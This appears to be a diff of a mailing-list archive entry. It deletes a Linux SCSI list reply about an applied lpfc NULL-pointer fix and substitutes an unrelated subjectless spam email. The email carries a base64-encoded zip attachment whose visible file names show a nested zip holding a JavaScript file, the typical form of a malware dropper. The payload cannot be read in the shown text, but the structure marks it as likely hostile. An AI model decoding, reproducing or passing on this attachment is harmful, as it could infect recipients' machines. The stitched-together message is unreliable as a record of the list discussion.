@@ -1,58 +1,102 @@
-From: "Guilherme G. Piccoli" <gpiccoli@linux.vnet.ibm.com>
-Subject: Re: [PATCH] lpfc: Fix NULL pointer dereference during PCI error
- recovery
-Date: Thu, 18 May 2017 10:35:28 -0300
-Message-ID: <fdb11722-529b-3bd5-64f0-581fb6a3d536@linux.vnet.ibm.com>
-References: <20170517220217.28337-1-gpiccoli@linux.vnet.ibm.com>
- <yq1y3tv6mmn.fsf@oracle.com>
+From: <alters@usg.edu>
+Subject: (unknown)
+Date: Thu, 18 May 2017 13:41:55 -0000
+Message-ID: <149511491527.1557.9755370578092582214@iol.cz>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="449685.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mx0a-001b2d01.pphosted.com ([148.163.156.1]:38439 "EHLO
-        mx0a-001b2d01.pphosted.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1755189AbdERNfp (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>);
-        Thu, 18 May 2017 09:35:45 -0400
-Received: from pps.filterd (m0098409.ppops.net [127.0.0.1])
-        by mx0a-001b2d01.pphosted.com (8.16.0.20/8.16.0.20) with SMTP id v4IDYhua027035
-        for <linux-scsi@vger.kernel.org>; Thu, 18 May 2017 09:35:44 -0400
-Received: from e24smtp01.br.ibm.com (e24smtp01.br.ibm.com [32.104.18.85])
-        by mx0a-001b2d01.pphosted.com with ESMTP id 2ahbjf3hwe-1
-        (version=TLSv1.2 cipher=AES256-SHA bits=256 verify=NOT)
-        for <linux-scsi@vger.kernel.org>; Thu, 18 May 2017 09:35:44 -0400
-Received: from localhost
-        by e24smtp01.br.ibm.com with IBM ESMTP SMTP Gateway: Authorized Use Only! Violators will be prosecuted
-        for <linux-scsi@vger.kernel.org> from <gpiccoli@linux.vnet.ibm.com>;
-        Thu, 18 May 2017 10:35:40 -0300
-Received: from d24av05.br.ibm.com (d24av05.br.ibm.com [9.18.232.44])
-        by d24relay04.br.ibm.com (8.14.9/8.14.9/NCO v10.0) with ESMTP id v4IDZcEx50397206
-        for <linux-scsi@vger.kernel.org>; Thu, 18 May 2017 10:35:38 -0300
-Received: from d24av05.br.ibm.com (localhost [127.0.0.1])
-        by d24av05.br.ibm.com (8.14.4/8.14.4/NCO v10.0 AVout) with ESMTP id v4IDZdq0008673
-        for <linux-scsi@vger.kernel.org>; Thu, 18 May 2017 10:35:39 -0300
-In-Reply-To: <yq1y3tv6mmn.fsf@oracle.com>
+Received: from 91.191.broadband10.iol.cz ([90.177.191.91]:43575 "HELO iol.cz"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753906AbdERNmT (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Thu, 18 May 2017 09:42:19 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: "Martin K. Petersen" <martin.petersen@oracle.com>
-Cc: linux-scsi@vger.kernel.org, raphasil@linux.vnet.ibm.com, james.smart@broadcom.com, dick.kennedy@broadcom.com, jsmart2021@gmail.com
+To: linux-scsi@vger.kernel.org
 
-On 05/17/2017 09:21 PM, Martin K. Petersen wrote:
-> 
-> Guilherme,
-> 
->> Recent commit on patchset "lpfc updates for 11.2.0.14" fixed an issue
->> about dereferencing a NULL pointer on port reset. The specific commit,
->> named "lpfc: Fix system crash when port is reset.", is missing a check
->> against NULL pointer on lpfc_els_flush_cmd() though.
->>
->> Since we destroy the queues on adapter resets, like in PCI error
->> recovery path, we need the validation present on this patch in order
->> to avoid a NULL pointer dereference when trying to flush commands of
->> ELS wq, after it has been destroyed (which would lead to a kernel
->> oops).
-> 
-> Applied to 4.12/scsi-fixes. Thank you!
-> 
-
-Thanks Martin!
+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
